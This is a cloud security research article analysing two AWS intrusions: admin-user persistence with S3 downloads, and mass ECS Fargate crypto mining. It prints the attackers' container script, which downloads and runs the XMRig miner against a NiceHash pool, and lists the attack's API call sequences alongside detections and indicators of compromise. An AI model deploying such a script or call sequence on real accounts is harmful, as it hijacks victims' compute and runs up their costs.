---
title: "Tales from the cloud trenches: Amazon ECS is the new EC2 for crypto mining"
url: "https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/"
author: Martin McCloskey, Christophe Tafani-Dereeper
published: 2024-01-19
source_type: article
source_domain: securitylabs.datadoghq.com
cleanup_method: llm
---

# Tales from the cloud trenches: Amazon ECS is the new EC2 for crypto mining

January 19, 2024

![Image 1: Tales From The Cloud Trenches: Amazon Ecs Is The New Ec2 For Crypto Mining](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-ecs-crypto-mining/hero.png?auto=format&h=712&dpr=1)

[![Image 2: Martin McCloskey](https://securitylabs.dd-static.net/img/authors/martin_mccloskey.png?auto=format&w=48&h=48&dpr=2&q=75) Martin McCloskey Senior Detection Engineer](https://securitylabs.datadoghq.com/articles/?author=Martin_McCloskey)[![Image 3: Christophe Tafani-Dereeper](https://imgix.datadoghq.com/img/blog/_authors/tafani-dereeper_christophe2.jpeg?auto=format&w=48&h=48&dpr=2&q=75) Christophe Tafani-Dereeper Cloud Security Researcher and Advocate](https://securitylabs.datadoghq.com/articles/?author=Christophe_Tafani-Dereeper)

In a [previous post](https://securitylabs.datadoghq.com/articles/following-attackers-trail-in-aws-methodology-findings-in-the-wild/), we covered common attacker behavior that we've witnessed in the wild across a number of AWS environments. Today, we report on attacker techniques that we've noticed from a cluster of malicious IP addresses originating from Indonesia, and affecting several environments.

## [Key points and observations](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#key-points-and-observations)

*   In this post, we explore attacker techniques in AWS that we've witnessed in December 2023 and January 2024, targeting AWS accounts and most of the time caused by a leaked IAM user access key.
*   In one case, an attacker enumerated the account, created additional IAM users that they used to authenticate through the AWS Console, attempted to move laterally using EC2 Instance Connect, and tried to start EC2 instances in an unused region.
*   In another case, an attacker created a high number of ECS on Fargate clusters, and executed a large number of malicious containers for crypto mining purposes.
*   We've witnessed both automated and "hands-on-keyboard" human activity.
*   Most of the IP addresses observed had a history of [residential proxy activity](https://medium.com/spur-intelligence/residential-proxies-the-legal-botnet-that-nobody-talks-about-4470cae7e3c), most likely to evade traditional deny-list IP threat intelligence defenses.

## [First observed attacker activity: Data exfiltration from S3 and attempted lateral movement through EC2 Instance Connect](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#first-observed-attacker-activity-data-exfiltration-from-s3-and-attempted-lateral-movement-through-ec2-instance-connect)

The first attacker started by enumerating SES quotas and identities (useful for sending spam) and IAM users in the account, then created a new administrator IAM user with a console profile. This initial activity is likely to have been automated and occurred within a time window of 11 seconds.

| **CloudTrail event** | **Threat Perspective** |
| --- | --- |
| `ses:GetSendQuota` | "What's the volume of emails I can send through this account?" |
| `ses:ListIdentities` | "Who can I impersonate?" |
| `iam:ListUsers` | "How many people are using this account?" |
| `iam:CreateUser` | "How can I persist if I lose access to the compromised access key?" |
| `iam:AttachUserPolicy` | `AdministratorAccess` |
| `iam:CreateLoginProfile` | Allows the attacker to log in through the AWS console with a password |

### [Hands-on-keyboard activity begins](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#hands-on-keyboard-activity-begins)

A few hours later, hands-on-keyboard activity started, and the attacker manually logged in to the AWS Console using the newly created user.

```json
{
  "eventType": "AwsConsoleSignIn",
  "eventSource": "signin.amazonaws.com",
  "eventName": "ConsoleLogin",
  "responseElements": {
    "ConsoleLogin": "Success"
  },
  "userIdentity": {
    "session_name": "aws_dev[random_digits]",
    "type": "IAMUser",
    "arn": "arn:aws:iam::012345678901:user/aws_dev[random_digits]",
    "userName": "aws_dev[random_digits]"
  }
}
```

From there, they used the console to enumerate a number of elements such as EC2 instances running in the account, volumes, security groups, and load balancers. They also leveraged the [AWS Resource Explorer](https://aws.amazon.com/resourceexplorer/) to list resources:

```json
{
  "eventSource": "resource-explorer-2.amazonaws.com",
  "eventName": "Search",
  "requestParameters": {
    "QueryString": "***"
  }
}
```

Then, still from the AWS Console, the attacker attempted to access several EC2 instances through [EC2 Instance Connect](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/connect-linux-inst-eic.html), a service built into Amazon Linux and Ubuntu AMIs that allows developers to dynamically provision SSH on EC2 instances.

```json
{
  "eventSource": "ec2-instance-connect.amazonaws.com",
  "eventName": "SendSSHPublicKey",
  "requestParameters": {
    "instanceId": "i-123456",
    "instanceOSUser": "ec2-user",
    "sSHPublicKey": "ssh-ed25519 [AWS autogenerated key]\n"
  }
}
```

If the instances had been available from the internet, this would have allowed the attacker to access them and subsequently steal credentials bound to their instance role.

### [S3 enumeration and exfiltration](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#s3-enumeration-and-exfiltration)

Still using the AWS Console, the attacker manually clicked on several S3 buckets to view objects inside them, browsed their directory tree, and downloaded files, generating `ListObjects` / `HeadObject` / `GetObject` events as they went.

| **CloudTrail events** | **Comment** |
| --- | --- |
| `s3:ListObjects` | Enumerate objects in an S3 bucket, possibly in a specific folder |
| `s3:HeadObject` | Retrieve metadata about an S3 object |
| **`s3:GetObject`** | Download an S3 object |
| **`kms:Decrypt`** | Triggered by AWS automatically because the file was KMS-encrypted |

### [Attempt to run `r6i.metal` EC2 instances in an unused region](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#attempt-to-run-r6imetal-ec2-instances-in-an-unused-region)

As a next step, the attacker attempted to run EC2 instances in an unused region, us-west-1. For this purpose, they used the AWS API credentials of the initially compromised user.

| **CloudTrail event** | **Comment** |
| --- | --- |
| `ec2:ImportKeyPair` | Create an SSH key pair |
| `ec2:CreateSecurityGroup` | Create a security group |
| `ec2:AuthorizeSecurityGroupIngress` | Open security group to 0.0.0.0/0 on port 22 |
| `ec2:RunInstances` | Run EC2 `r6i.metal` instances, running an Ubuntu Server AMI |

```json
{
  "eventSource": "ec2.amazonaws.com",
  "eventName": "RunInstances",
  "requestParameters": {
    "instancesSet": {
      "items": [{
          "imageId": "[redacted]",
          "keyName": "[redacted]",
          "minCount": 2,
          "maxCount": 2
      }]
    },
    "instanceType": "r6i.metal",
    "groupSet": {
      "items": [{
        "groupName": "[redacted]"
      }]
    }
  },
  "error": {
    "kind": "Client.PendingVerification",
    "message": "Your request for accessing resources in this region is being validated, and you will not be able to launch additional resources in this region until the validation is complete. We will notify you by email once your request has been validated. While normally resolved within minutes, please allow up to 4 hours for this process to complete. If the issue still persists, then open a support case. [https://support.console.aws.amazon.com/support/home?region=us-east-1#/case/create?issueType=customer-service&serviceCode=account-management&categoryCode=account-verification]"
  }
}
```

As the error message indicates, this attempt failed, most likely due to AWS flagging the activity as suspicious.

### [Additional persistence](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#additional-persistence)

Finally, the attacker created two additional administrator IAM users, along with a login profile and an access key. These IAM users were named after the pattern `aws-cli[random_string]`.

### [Summary of attacker activity](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#summary-of-attacker-activity)

[![Image 4](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-ecs-crypto-mining/attacker-activity-1.png?auto=format&w=800&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-ecs-crypto-mining/attacker-activity-1.png?auto=format)
MITRE ATT&CK mappings:

| **Initial Access** | **Persistence** | **Privilege Escalation** | **Defense Evasion** | **Discovery** | **Lateral Movement** | **Collection** |
| --- | --- | --- | --- | --- | --- | --- |
| [Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) | [Create Account: Cloud Account](https://attack.mitre.org/techniques/T1136/003/) | [T1098.004 - Account Manipulation: SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004/) | [Unused/Unsupported Regions](https://attack.mitre.org/techniques/T1535/) | [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526) | [Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/) | [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/) |
|  | [Account Manipulation: Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/) |  | [Impair Defenses: Disable or Modify Cloud Firewall](https://attack.mitre.org/techniques/T1562/007/) | [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) |  |  |
|  | [Account Manipulation: Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003/) |  |  | [Account Discovery: Cloud Account](https://attack.mitre.org/techniques/T1087/004/) |  |  |

## [Second observed attacker activity: Infrastructure-heavy crypto mining on ECS](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#second-observed-attacker-activity-infrastructure-heavy-crypto-mining-on-ecs)

In the second observed attacker activity, the threat actor did not bother to enumerate anything, be it the identity they compromised or their permissions. Instead, they started creating malicious infrastructure on the spot.

### [Bring your own ECS cluster](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#bring-your-own-ecs-cluster)

Contrasting with the previous activity, this time the threat actor created a large number of resources right away. In less than two minutes, they:

*   Created multiple ECS Fargate clusters with randomized names
*   Ran malicious containers in these clusters, by creating ECS task definitions
*   Scaled each task definition using an ECS service, to ensure that each task definition runs 25 tasks
*   Repeated the same process in no fewer than 17 regions

Overall, we believe that the attacker successfully created hundreds of ECS Fargate clusters and ECS tasks, based on 40 container images hosted on the Docker Hub (see full list in the [annex](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#indicators-of-compromise)). This means the attacker was likely able to successfully deploy thousands of malicious running containers.

```json
{
  "eventSource": "ecs.amazonaws.com",
  "eventName": "CreateCluster",
  "requestParameters": {
    "clusterName": "[random string]"
  },
  "responseElements": {
    "cluster": {
      "pendingTasksCount": 0,
      "clusterArn": "arn:aws:ecs:us-east-1:012345678901:cluster/[random string]",
      "activeServicesCount": 0,
      "runningTasksCount": 0,
      "clusterName": "[random string]",
      "registeredContainerInstancesCount": 0,
      "status": "ACTIVE"
    },
    "clusterCount": 0
  }
}
```

```json
{
  "eventSource": "ecs.amazonaws.com",
  "eventName": "RegisterTaskDefinition",
  "requestParameters": {
    "networkMode": "awsvpc",
    "memory": "32768",
    "cpu": "16384",
    "family": "[random string]",
    "requiresCompatibilities": ["FARGATE"],
    "containerDefinitions": [{
        "image": "yzsqbe/ka:si",
        "name": "[random string]",
        "cpu": 0
    }]
  }
}
```

```json
{
  "eventSource": "ecs.amazonaws.com",
  "eventName": "CreateService",
  "requestParameters": {
    "cluster": "[random string]",
    "serviceName": "[random string]-service",
    "networkConfiguration": {
      "awsvpcConfiguration": {
        "assignPublicIp": "ENABLED",
        "subnets": ["..."]
      }
    },
    "desiredCount": 25,
    "taskDefinition": "[random string]"
  }
}
```

### [Analyzing the malicious container images](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#analyzing-the-malicious-container-images)

All the Docker Hub users hosting malicious images were registered on October 18, 2023 around 10:00 a.m. UTC, and the malicious images were uploaded either on October 24, 2023 or November 16, 2023. Most of them had between 20,000 and 100,000 pulls, and those numbers keep going up. These two elements seem to indicate that this is a recent and active campaign.

The Docker images themselves are all very similar to each other and contain an entrypoint, `/run.sh`, that downloads XMRig and starts mining cryptocurrency:

```bash
APP=app$(shuf -i 1000000-9999999 -n 1)
wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar -zxf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
mv xmrig $APP
chmod +x $APP
./$APP -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -p x -t $(nproc --all) -u [bitcoin address]
```

Only the target cryptocurrency address, at the end, changes across images. Using an utility like [dive](https://github.com/wagoodman/dive) or [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/README.md), we can see that these images are built from a Dockerfile that explicitly sets a time zone in the container, hinting towards the geographic location the threat actors operate from:

```dockerfile
ENV TZ=Europe/Moscow
```

We have investigated the available bitcoin (BTC) addresses from the docker images—As of January 19, 2024, they are reporting 0.00BTC. This was surprising based on the number of image pulls we saw, and we can only guess that the attackers have not had a long enough window of compromise to generate the minimum payout threshold set by [nicehash](https://www.nicehash.com/support/mining-help/earnings-and-payments/can-i-get-paid-to-an-external-wallet-address) (0.001BTC) when you mine to an external wallet.

### [Summary of attacker activity](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#summary-of-attacker-activity-1)

[![Image 5](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-ecs-crypto-mining/attacker-activity-2.png?auto=format&w=800&dpr=1.75) (click to enlarge)](https://securitylabs.dd-static.net/img/tales-from-the-cloud-trenches-ecs-crypto-mining/attacker-activity-2.png?auto=format)
MITRE ATT&CK mappings:

| **Execution** | **Impact** |
| --- | --- |
| [Deploy Container](https://attack.mitre.org/techniques/T1610/) | [Resource Hijacking](https://attack.mitre.org/techniques/T1496) |

## [Remediating the attack](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#remediating-the-attack)

_Note: Remediating attacker activity is always highly dependent on the environment—teams typically build playbooks iteratively. The advice we offer below may not be comprehensive._

First, we have to understand the full extent of the compromise. For this goal, having access to and knowledge of the environment is of paramount importance. For instance, knowing if the EC2 instances targeted by the `ec2-instance-connect:SendSSHPublicKey` call were accessible from the internet is necessary to determine if they were compromised as well. Similarly, we need to know if all S3 buckets in the account have S3 Data Events enabled to identify what data was downloaded.

Then, once we understand the full scope and impact of the attack, we can remove the malicious and compromised IAM users to cut off attacker access to our environment. This is typically done by removing malicious IAM users and compromised access keys. AWS also has a [playbook](https://github.com/aws-samples/aws-customer-playbook-framework/blob/main/docs/Compromised_IAM_Credentials.md) available.

After that, we need to get rid of the malicious infrastructure. Once this is done, we can use the AWS Resource Explorer to confirm that no unexpected ECS cluster remains, across all regions:

```bash
aws resource-explorer-2 search --query-string 'resourcetype:ecs:cluster'
```

Finally, the root cause analysis should trigger an action item to avoid using IAM users with static credentials, and instead to use role assumptions or OpenID Connect [keyless authentication](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services) when possible.

## [Detection opportunities](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#detection-opportunities)

Below, we share some ideas of threat detection rules that you can implement to identify similar activity.

*   Identify spikes in API calls that create infrastructure, such as `ecs:CreateCluster` or `ec2:RunInstances`, especially in previously unused AWS regions.
*   Monitor or disable the creation of new IAM users and the attachment of administrative privileges to them.
*   Monitor suspicious sequences of API calls frequently used by attackers to gain access to or spin up infrastructure, such as `ec2:ImportKeyPair`, `ec2:CreateSecurityGroup`, or `ec2:AuthorizeSecurityGroupIngress`.
*   Monitor images deployed to ECS clusters, through the field `requestParameters.containerDefinitions.image` of the `ecs:RegisterTaskDefinition` CloudTrail event. Note that it's not currently possible to enforce image signature or an allow-list of repositories in ECS clusters.
*   Monitor usage and spikes in cloud costs. Spiking costs for an unused cloud service or region can often be a strong indicator of malicious activity.

## [How Datadog can help](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#how-datadog-can-help)

[Datadog Cloud SIEM](https://www.datadoghq.com/product/cloud-siem/) comes with the following out-of-the-box rules to identify related suspicious activity in an AWS environment.

*   [AWS IAM User created with AdministratorAccess policy attached](https://docs.datadoghq.com/security/default_rules/def-000-ilw)
*   [Possible privilege escalation via AWS login profile manipulation](https://docs.datadoghq.com/security/default_rules/fps-y8k-odm)
*   [Compromised AWS IAM User Access Key](https://docs.datadoghq.com/security/default_rules/yqe-gyj-js8)
*   [AWS console login without MFA](https://docs.datadoghq.com/security/default_rules/208-e1f-0f9)
*   [Potential administrative port open to the world via AWS security group](https://docs.datadoghq.com/security/default_rules/a3p-xtg-ryo)
*   [Security group open to the world](https://docs.datadoghq.com/security/default_rules/6f3-c4d-9f0)
*   [AWS security group created, modified or deleted](https://docs.datadoghq.com/security/default_rules/cca-fc9-b0e)
*   [AWS IAM AdministratorAccess policy was applied to a user](https://docs.datadoghq.com/security/default_rules/def-000-sd5)
*   [New Amazon EC2 Instance type](https://docs.datadoghq.com/security/default_rules/a8d-afd-la9)

The [Cloud SIEM Investigator](https://docs.datadoghq.com/security/cloud_siem/investigator/?tab=aws) allows you to visually investigate CloudTrail logs and follow the trail of an attacker so you can respond in graphs versus lists.

## [Conclusion](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#conclusion)

Based on our analysis of this activity, there appears to be an increase in the targeting of the AWS ECS service by financially motivated attackers with the intent of mining cryptocurrency, possibly due to the ease of deployment or to evade detections in EC2. We think this warrants a closer look by detection and response teams so they can better prepare to respond to these types of attacks in the future.

## [Indicators of compromise](https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#indicators-of-compromise)

| Indicator | Type |
| --- | --- |
| `aws_dev[random digits]` | IAM user name |
| `aws-cli[random string]` | IAM user name |
| ahnoyp/ak:ma | Docker image name |
| ahnoyp/ku:mi | Docker image name |
| cxgdyr/ca:da | Docker image name |
| cxgdyr/ku:en | Docker image name |
| dilgrw/ca:za | Docker image name |
| dilgrw/ku:lo | Docker image name |
| enicfc/ca:mu | Docker image name |
| enicfc/mu:ja | Docker image name |
| etiuaz/ac:an | Docker image name |
| etiuaz/uj:ku | Docker image name |
| flmmov/ad:ai | Docker image name |
| flmmov/ol:ak | Docker image name |
| fmrfyl/yu:da | Docker image name |
| fmrfyl/ba:ki | Docker image name |
| gqjbmv/mu:sa | Docker image name |
| gqjbmv/sa:ba | Docker image name |
| itzwsl/gi:lq | Docker image name |
| itzwsl/kl:al | Docker image name |
| lhnxzb/ak:am | Docker image name |
| lhnxzb/ik:mu | Docker image name |
| lktbai/ti:ab | Docker image name |
| lktbai/ki:bu | Docker image name |
| oaersw/do:ra | Docker image name |
| oaersw/bu:sa | Docker image name |
| pecxnp/pu:pi | Docker image name |
| pecxnp/bo:bi | Docker image name |
| uroicm/ri:do | Docker image name |
| uroicm/ku:do | Docker image name |
| vxfegj/ja:an | Docker image name |
| vxfegj/ka:je | Docker image name |
| vykixv/ad:nu | Docker image name |
| vykixv/ka:mj | Docker image name |
| xpgsmf/fa:an | Docker image name |
| xpgsmf/lu:an | Docker image name |
| yzsqbe/se:ab | Docker image name |
| yzsqbe/ka:si | Docker image name |
| zopklw/wi:ab | Docker image name |
| zopklw/ko:sy | Docker image name |
| zsztqa/yi:an | Docker image name |
| zsztqa/ak:ha | Docker image name |
| AS7713 (Telekomunikasi Indonesia Int (TELIN)) | Originating ASN |
| AS24203 (PT XL Axiata) | Originating ASN |
| 140[.]213.52.0/24 | IP Address block containing a number of malicious IP addresses |
